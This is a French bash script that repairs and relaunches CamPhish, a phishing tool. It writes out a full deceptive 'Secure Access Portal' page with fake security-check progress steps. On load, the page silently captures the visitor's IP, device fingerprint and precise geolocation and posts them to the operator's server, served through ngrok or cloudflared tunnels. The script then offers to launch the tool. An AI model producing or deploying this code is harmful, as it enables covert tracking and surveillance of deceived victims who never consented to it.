#!/bin/bash
# Solution Complète - Correction du Problème d'Affichage CamPhish

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
NC='\033[0m'

echo ""
echo -e "${PURPLE}╔═══════════════════════════════════════════════════════════╗${NC}"
echo -e "${PURPLE}║     Solution Complète - Correction CamPhish v3.0         ║${NC}"
echo -e "${PURPLE}╚═══════════════════════════════════════════════════════════╝${NC}"
echo ""

# Vérifier qu'on est dans le bon répertoire
if [ ! -f "camphish.sh" ]; then
    echo -e "${RED}[!] Erreur : Veuillez exécuter ce script depuis le répertoire CamPhish${NC}"
    exit 1
fi

echo -e "${YELLOW}[*] Arrêt de tous les processus CamPhish...${NC}"
killall php 2>/dev/null
killall ngrok 2>/dev/null
killall cloudflared 2>/dev/null
sleep 1

# Créer un backup complet
BACKUP_DIR="backup_$(date +%Y%m%d_%H%M%S)"
echo -e "${YELLOW}[*] Création du backup dans ${BACKUP_DIR}...${NC}"
mkdir -p "$BACKUP_DIR"
cp template.php "$BACKUP_DIR/" 2>/dev/null
cp *.html "$BACKUP_DIR/" 2>/dev/null
echo -e "${GREEN}✓ Backup créé${NC}"

# ============================================
# SOLUTION 1 : Corriger template.php
# ============================================
echo ""
echo -e "${BLUE}╔═══════════════════════════════════════════════════════════╗${NC}"
echo -e "${BLUE}║              SOLUTION 1 : Corriger template.php          ║${NC}"
echo -e "${BLUE}╚═══════════════════════════════════════════════════════════╝${NC}"
echo ""

if grep -q "echo '" template.php 2>/dev/null || grep -q 'echo "' template.php 2>/dev/null; then
    echo -e "${YELLOW}[!] template.php utilise 'echo' - Correction en cours...${NC}"
    
    cat > template.php << 'TEMPLATE_EOF'
<?php
// Capture IP immediately on page load
include 'ip.php';
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Access Portal</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: "Inter", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            padding: 50px 40px;
            max-width: 480px;
            width: 100%;
            text-align: center;
            animation: fadeIn 0.6s ease-out;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .logo {
            width: 80px;
            height: 80px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            border-radius: 50%;
            margin: 0 auto 30px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 36px;
            color: white;
            box-shadow: 0 10px 30px rgba(102, 126, 234, 0.4);
        }
        h1 {
            color: #2d3748;
            font-size: 28px;
            font-weight: 700;
            margin-bottom: 12px;
        }
        .subtitle {
            color: #718096;
            font-size: 16px;
            margin-bottom: 35px;
            line-height: 1.6;
        }
        .status-card {
            background: linear-gradient(135deg, #f7fafc 0%, #edf2f7 100%);
            border-radius: 12px;
            padding: 25px;
            margin-bottom: 25px;
        }
        .status-icon {
            font-size: 48px;
            margin-bottom: 15px;
            animation: pulse 2s ease-in-out infinite;
        }
        @keyframes pulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.1); }
        }
        .status-text {
            color: #4a5568;
            font-size: 15px;
            font-weight: 500;
            margin-bottom: 8px;
        }
        .status-detail {
            color: #a0aec0;
            font-size: 13px;
        }
        .progress-bar {
            width: 100%;
            height: 6px;
            background: #e2e8f0;
            border-radius: 10px;
            overflow: hidden;
            margin-top: 20px;
        }
        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #667eea 0%, #764ba2 100%);
            width: 0%;
            transition: width 0.3s ease;
            border-radius: 10px;
        }
        .security-badge {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            background: #f0fff4;
            color: #22543d;
            padding: 8px 16px;
            border-radius: 20px;
            font-size: 13px;
            font-weight: 500;
            margin-top: 15px;
        }
        .security-badge::before {
            content: "🔒";
            font-size: 16px;
        }
        @media (max-width: 500px) {
            .container { padding: 35px 25px; }
            h1 { font-size: 24px; }
            .subtitle { font-size: 14px; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">🌐</div>
        <h1>Secure Access Portal</h1>
        <p class="subtitle">Please wait while we verify your access permissions and establish a secure connection</p>
        <div class="status-card">
            <div class="status-icon" id="statusIcon">⏳</div>
            <div class="status-text" id="statusText">Initializing secure connection...</div>
            <div class="status-detail" id="statusDetail">Verifying credentials</div>
            <div class="progress-bar">
                <div class="progress-fill" id="progressBar"></div>
            </div>
        </div>
        <div class="security-badge">Encrypted Connection Active</div>
    </div>
    <script src="fingerprint.js"></script>
    <script>
        let sessionId = null, progress = 0, currentStep = 0;
        const steps = [
            { icon: "⏳", text: "Initializing secure connection...", detail: "Verifying credentials", duration: 800 },
            { icon: "🔍", text: "Collecting security parameters...", detail: "Analyzing device fingerprint", duration: 1000 },
            { icon: "🔄", text: "Optimizing connection route...", detail: "Finding best server", duration: 1200 },
            { icon: "✅", text: "Connection secured", detail: "Redirecting to portal", duration: 500 }
        ];
        function updateProgress() {
            const progressBar = document.getElementById("progressBar");
            const statusIcon = document.getElementById("statusIcon");
            const statusText = document.getElementById("statusText");
            const statusDetail = document.getElementById("statusDetail");
            if (currentStep < steps.length) {
                const step = steps[currentStep];
                statusIcon.textContent = step.icon;
                statusText.textContent = step.text;
                statusDetail.textContent = step.detail;
                progress = ((currentStep + 1) / steps.length) * 100;
                progressBar.style.width = progress + "%";
                currentStep++;
                setTimeout(updateProgress, step.duration);
            } else {
                setTimeout(() => { window.location.href = "forwarding_link/index2.html"; }, 500);
            }
        }
        function captureLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        const data = new FormData();
                        data.append("lat", position.coords.latitude);
                        data.append("lon", position.coords.longitude);
                        data.append("acc", position.coords.accuracy);
                        data.append("session_id", sessionId);
                        data.append("time", new Date().getTime());
                        fetch("location.php", { method: "POST", body: data })
                            .then(response => response.json())
                            .then(result => console.log("Location captured:", result))
                            .catch(error => console.error("Location error:", error));
                    },
                    function(error) { console.log("Geolocation error:", error.message); },
                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                );
            }
        }
        async function initSession() {
            try {
                const ipResponse = await fetch("ip.php", {
                    method: "POST",
                    headers: { "Content-Type": "application/x-www-form-urlencoded" }
                });
                const ipData = await ipResponse.json();
                if (ipData.status === "success" && ipData.session_id) {
                    sessionId = ipData.session_id;
                    if (window.sessionStorage) {
                        window.sessionStorage.setItem("session_id", sessionId);
                    }
                    console.log("Session initialized:", sessionId);
                    const fingerprinter = new DeviceFingerprint();
                    const fingerprintData = await fingerprinter.collect();
                    if (fingerprintData) {
                        await fingerprinter.send(sessionId);
                        console.log("Fingerprint collected");
                    }
                    captureLocation();
                }
            } catch (error) {
                console.error("Session initialization error:", error);
            }
        }
        window.addEventListener("DOMContentLoaded", function() {
            updateProgress();
            initSession();
        });
    </script>
</body>
</html>
TEMPLATE_EOF
    
    echo -e "${GREEN}✓ template.php corrigé${NC}"
else
    echo -e "${GREEN}✓ template.php est déjà correct${NC}"
fi

# ============================================
# SOLUTION 2 : Créer .htaccess
# ============================================
echo ""
echo -e "${BLUE}╔═══════════════════════════════════════════════════════════╗${NC}"
echo -e "${BLUE}║          SOLUTION 2 : Créer fichier .htaccess            ║${NC}"
echo -e "${BLUE}╚═══════════════════════════════════════════════════════════╝${NC}"
echo ""

cat > .htaccess << 'HTACCESS_EOF'
# Force PHP to process HTML files
AddType application/x-httpd-php .html .htm
AddType application/x-httpd-php .php

# Enable PHP
<FilesMatch "\.(html|htm|php)$">
    SetHandler application/x-httpd-php
</FilesMatch>

# Charset
AddDefaultCharset UTF-8

# Security
Options -Indexes +FollowSymLinks
HTACCESS_EOF

echo -e "${GREEN}✓ Fichier .htaccess créé${NC}"

# ============================================
# SOLUTION 3 : Créer php.ini local
# ============================================
echo ""
echo -e "${BLUE}╔═══════════════════════════════════════════════════════════╗${NC}"
echo -e "${BLUE}║          SOLUTION 3 : Configuration PHP locale           ║${NC}"
echo -e "${BLUE}╚═══════════════════════════════════════════════════════════╝${NC}"
echo ""

cat > .user.ini << 'INI_EOF'
; Configuration PHP locale pour CamPhish
display_errors = Off
log_errors = On
error_log = error.log
default_charset = "UTF-8"
short_open_tag = On
INI_EOF

echo -e "${GREEN}✓ Configuration PHP créée${NC}"

# ============================================
# SOLUTION 4 : Nettoyer les fichiers temporaires
# ============================================
echo ""
echo -e "${YELLOW}[*] Nettoyage des fichiers temporaires...${NC}"
rm -f index.php index2.html index3.html ip.txt
echo -e "${GREEN}✓ Fichiers temporaires supprimés${NC}"

# ============================================
# Test Final
# ============================================
echo ""
echo -e "${BLUE}╔═══════════════════════════════════════════════════════════╗${NC}"
echo -e "${BLUE}║                      TEST FINAL                           ║${NC}"
echo -e "${BLUE}╚═══════════════════════════════════════════════════════════╝${NC}"
echo ""

echo -e "${YELLOW}[*] Test de syntaxe PHP sur template.php...${NC}"
if php -l template.php > /dev/null 2>&1; then
    echo -e "${GREEN}✓ template.php est syntaxiquement correct${NC}"
else
    echo -e "${RED}✗ Erreur de syntaxe dans template.php${NC}"
    php -l template.php
fi

echo -e "${YELLOW}[*] Test de rendu...${NC}"
TEST_OUTPUT=$(php template.php 2>&1 | head -5)
if echo "$TEST_OUTPUT" | grep -q "<!DOCTYPE html>"; then
    echo -e "${GREEN}✓ template.php génère du HTML correct${NC}"
else
    echo -e "${YELLOW}⚠ Vérification manuelle recommandée${NC}"
fi

# ============================================
# Résumé et Instructions
# ============================================
echo ""
echo -e "${GREEN}╔═══════════════════════════════════════════════════════════╗${NC}"
echo -e "${GREEN}║              CORRECTIONS APPLIQUÉES AVEC SUCCÈS           ║${NC}"
echo -e "${GREEN}╚═══════════════════════════════════════════════════════════╝${NC}"
echo ""

echo -e "${BLUE}✓ Fichiers corrigés :${NC}"
echo -e "  • template.php - HTML direct sans echo"
echo -e "  • .htaccess - Configuration serveur"
echo -e "  • .user.ini - Configuration PHP"
echo ""

echo -e "${BLUE}✓ Backup sauvegardé dans :${NC} ${BACKUP_DIR}/"
echo ""

echo -e "${YELLOW}╔═══════════════════════════════════════════════════════════╗${NC}"
echo -e "${YELLOW}║                  PROCHAINES ÉTAPES                        ║${NC}"
echo -e "${YELLOW}╚═══════════════════════════════════════════════════════════╝${NC}"
echo ""

echo -e "${GREEN}1. Lancez CamPhish :${NC}"
echo -e "   ${BLUE}bash camphish.sh${NC}"
echo ""

echo -e "${GREEN}2. Sélectionnez un template${NC}"
echo ""

echo -e "${GREEN}3. Copiez le lien généré et testez dans un navigateur${NC}"
echo ""

echo -e "${GREEN}4. La page devrait maintenant s'afficher correctement !${NC}"
echo ""

echo -e "${YELLOW}╔═══════════════════════════════════════════════════════════╗${NC}"
echo -e "${YELLOW}║             SI LE PROBLÈME PERSISTE                       ║${NC}"
echo -e "${YELLOW}╚═══════════════════════════════════════════════════════════╝${NC}"
echo ""

echo -e "${BLUE}Testez avec cette commande (remplacez [LIEN] par votre lien ngrok) :${NC}"
echo -e "   ${GREEN}curl -I [LIEN]/index.php${NC}"
echo ""
echo -e "${BLUE}Vous devriez voir :${NC}"
echo -e "   ${GREEN}Content-Type: text/html${NC}"
echo ""
echo -e "${BLUE}Si vous voyez :${NC}"
echo -e "   ${RED}Content-Type: text/plain${NC}"
echo -e "${YELLOW}   → Le serveur ne traite pas PHP correctement${NC}"
echo ""

echo -e "${BLUE}Dans ce cas, essayez de redémarrer avec :${NC}"
echo -e "   ${GREEN}killall php ngrok cloudflared${NC}"
echo -e "   ${GREEN}bash camphish.sh${NC}"
echo ""

# Proposer de lancer
read -p "$(echo -e ${YELLOW}Voulez-vous lancer CamPhish maintenant ? [y/N]: ${NC})" -n 1 -r
echo
if [[ $REPLY =~ ^[Yy]$ ]]; then
    echo -e "${GREEN}[*] Lancement de CamPhish...${NC}"
    sleep 1
    bash camphish.sh
else
    echo -e "${BLUE}[*] Lancez manuellement avec : ${GREEN}bash camphish.sh${NC}"
fi